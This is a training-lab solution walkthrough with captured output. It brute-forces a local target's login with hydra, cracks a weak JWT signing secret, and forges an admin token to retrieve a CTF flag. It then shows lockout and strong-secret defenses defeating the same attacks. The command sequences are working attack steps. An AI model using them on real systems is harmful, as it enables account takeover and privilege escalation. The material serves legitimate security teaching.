# Day 4 Lab — Solution / Verify Walkthrough

## Authorized use only

Same notice as [`README.md`](README.md): only run these commands against the `target`
container this lab starts, on `cyberlab`, or your own AWS sandbox in later phases.

## Step-by-step, with actual captured output

All output below was captured from a real run of this lab (`labs/base` up, then
`labs/day04` built and started with `docker compose up -d --build`, then
`jwt_forge.py`/`passwords.txt`/`secrets.txt` staged into `/loot/day04` with a plain
`cp`). Every `docker compose exec attacker ...` command below was run **from
`labs/base`** — running it from `labs/day04` fails with `service "attacker" is not
running`, same gotcha as every earlier day.

### 0. Stage the lab files (no extra container)

```sh
cd cyber_security/labs/day04
mkdir -p ../base/loot/day04
cp jwt_forge.py passwords.txt secrets.txt ../base/loot/day04/
```

Confirmed: `labs/base/loot/day04/` now contains `jwt_forge.py`, `passwords.txt`,
`secrets.txt`, visible inside the already-running `attacker` container at
`/loot/day04/` immediately (no restart needed — `/loot` is a plain bind mount).

### 1. Recon the target

```sh
docker compose exec attacker sh -c "curl -s target:5000/ ; echo"
```

Confirmed output:

```
<h1>cyberlab-day04-target</h1><p>Routes: GET/POST /login, POST /api/token, GET /api/whoami, GET /api/admin</p>
```

### 2. Brute force `/login` with hydra

**Exact hydra http-post-form string used** (note the explicit `-s 5000` — the target
listens on 5000, not hydra's http default of 80, and omitting `-s 5000` produces
`[ERROR] ... cannot connect` for every candidate):

```sh
docker compose exec attacker sh -c "hydra -s 5000 -l admin -P /loot/day04/passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid username or password'"
```

Confirmed output:

```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-12 15:23:54
[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:1/p:10), ~1 try per task
[DATA] attacking http-post-form://target:5000/login:username=^USER^&password=^PASS^:F=Invalid username or password
[5000][http-post-form] host: target   misc: /login:username=^USER^&password=^PASS^:F=Invalid username or password   login: admin   password: letmein
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-12 15:23:55
```

**Cracked credentials: `admin` / `letmein`.**

**Exit-code note (see README/content for the full explanation):** this particular run
happened to exit `0`. That is NOT reliable across hydra versions/invocations — `hydra
-h` and other invocations exit non-zero by design even when nothing went wrong. Never
gate a verify on `hydra ... && echo OK`. The working verify command (used below) writes
hydra's own report to a file with `-o` and checks that file's content, on its own line,
independent of hydra's exit code.

### 3. Get a JWT with the cracked creds, decode it

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s -X POST target:5000/api/token -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"letmein\"}' | jq -r .token)
echo TOKEN=\$TOKEN
python3 /loot/day04/jwt_forge.py decode \$TOKEN
"
```

Confirmed output:

```
TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzg2NTUxODUyfQ.8q3NmvqnQbS-ceti1nIYLaJMdMgn8dCLK0CtU5ZBHP4
header:  {'alg': 'HS256', 'typ': 'JWT'}
payload: {'sub': 'admin', 'role': 'user', 'exp': 1786551852}
```

Note `"role": "user"` — this legitimate token cannot reach `/api/admin` (confirmed in
Step 5's sanity check below).

### 4. Crack the JWT secret offline

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s -X POST target:5000/api/token -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"letmein\"}' | jq -r .token)
python3 /loot/day04/jwt_forge.py crack \$TOKEN /loot/day04/secrets.txt
"
```

Confirmed output:

```
SECRET FOUND: cyberlab
```

### 5. Forge an admin token and call `/api/admin`

```sh
docker compose exec attacker sh -c "
FORGED=\$(python3 /loot/day04/jwt_forge.py forge cyberlab '{\"sub\":\"admin\",\"role\":\"admin\",\"exp\":9999999999}')
echo FORGED=\$FORGED
curl -s target:5000/api/admin -H \"Authorization: Bearer \$FORGED\"
echo
"
```

Confirmed output:

```
FORGED=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.poidiuJFt6mmhuujcEHYpJ0-Cb9jbzDRINi27-5yNKc
{"flag":"CTF{jwt-forged-with-a-guessable-secret}"}
```

**Sanity check — the original, legitimate `role:user` token is correctly refused:**

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s -X POST target:5000/api/token -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"letmein\"}' | jq -r .token)
curl -s target:5000/api/admin -H \"Authorization: Bearer \$TOKEN\"
echo
"
```

Confirmed output: `{"error":"admin role required"}` — proving the escalation came
specifically from the forged `role:admin` claim, not from some other bug in
`/api/admin`.

### Verify (exact command, exit-code-safe per the hydra note above)

```sh
cd cyber_security/labs/base
docker compose exec attacker sh -c "hydra -s 5000 -l admin -P /loot/day04/passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid username or password' -o /loot/day04/hydra_out.txt >/dev/null 2>&1; grep -qi 'login:' /loot/day04/hydra_out.txt && echo ATTACK_OK"
```

Confirmed output: `ATTACK_OK`.

**Why this shape, not the plan's original literal `hydra ... | grep ... && echo OK`:**
piping hydra directly into `&&` makes success depend on hydra's own process exit code
via the pipeline, which is exactly what the HYDRA NOTE warns against — some hydra
invocations exit non-zero by design even on a fully successful run. Writing hydra's
report to a file with `-o` and running `grep` against that file, on a separate
statement (`;`, not `&&`) from the hydra invocation, makes the verify's pass/fail
condition depend only on grep's exit code against real file content — never on
hydra's own exit status.

## Defense Lab — confirmed before/after

### Defense 1 — login lockout (uncomment, rebuild, re-run hydra)

Uncommenting the lockout block in `target/app.py`'s `login()` (Defense Lab section of
`content/day04-auth.md`), then `docker compose up -d --build`, then re-running hydra
with an OR'd failure condition that also matches the lockout response text:

```sh
docker compose exec attacker sh -c "hydra -t 1 -s 5000 -l admin -P /loot/day04/passwords.txt target http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid username or password|Account locked'"
```

Confirmed output: `1 of 1 target completed, 0 valid password found` — the brute force
now fails outright. Direct curl confirmation of *why*, against a freshly restarted
(state-cleared) target:

```sh
docker compose exec attacker sh -c "
curl -s -w ' [%{http_code}]\n' target:5000/login -d 'username=admin&password=wrong1'
curl -s -w ' [%{http_code}]\n' target:5000/login -d 'username=admin&password=wrong2'
curl -s -w ' [%{http_code}]\n' target:5000/login -d 'username=admin&password=wrong3'
curl -s -w ' [%{http_code}]\n' target:5000/login -d 'username=admin&password=letmein'
"
```

Confirmed output:

```
Invalid username or password. [200]
Invalid username or password. [200]
Invalid username or password. [200]
Account locked: too many failed attempts. Try again later. [429]
```

**Important, honest gotcha:** the 4th line above is the *correct* password
(`letmein`) — and it still gets a `429`, because `passwords.txt` tries `password`,
`123456`, `admin` before `letmein`, and 3 wrong guesses already used up the lockout
budget. That's the point, not a bug: a 3-strikes lockout blocks the attacker's
eventual correct guess exactly as hard as it blocks the wrong ones, which is the whole
value of the control. A **second** gotcha worth naming explicitly: hydra's own
`F=Invalid username or password` condition alone is **not enough** once lockout is
live — the `429` lockout response body doesn't contain that exact string, so hydra
(which treats "doesn't match F" as "must be success") would misreport every locked
attempt as a *valid password* (confirmed: with only the original `F=` string, hydra
reported "7 valid passwords found" post-lockout — all false positives). The fix, shown
in the command above, is `F=Invalid username or password|Account locked` — hydra's
condition strings support `|` as OR, so both real-failure and locked-out responses
correctly register as failures.

### Defense 2 — strong JWT secret (edit, rebuild, re-run crack)

Changing `JWT_SECRET` in `target/app.py` from `"cyberlab"` to a long random value (e.g.
a 64-hex-character string), then `docker compose up -d --build`, then re-running the
Step 4 crack command against the SAME `secrets.txt`:

```sh
docker compose exec attacker sh -c "
TOKEN=\$(curl -s -X POST target:5000/api/token -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"letmein\"}' | jq -r .token)
python3 /loot/day04/jwt_forge.py crack \$TOKEN /loot/day04/secrets.txt
"
```

Confirmed output: `no candidate in wordlist matched` (script exits `1`) — the identical
forging technique, against the identical `verify_jwt()` code, now fails purely because
the secret is no longer in any reasonably-sized guess list. Nothing about the *code*
changed; only the secret's strength did.

**Restoring the baseline:** both defenses above were tested against a temporary copy of
`target/app.py`/its secret and then reverted before this lab shipped — the file as
committed ships with the lockout block commented out and `JWT_SECRET = "cyberlab"`, so
the Attack Lab steps above reproduce exactly as documented on a fresh `docker compose
up -d --build`.

## Teardown

```sh
cd cyber_security/labs/day04
docker compose down
```

This removes only `target` — `labs/base`'s `attacker` container, the `cyberlab`
network, and the staged files under `labs/base/loot/day04/` are untouched. Tear down
`labs/base` separately (`cd ../base && ./down.sh`) only once you're done with the whole
session.
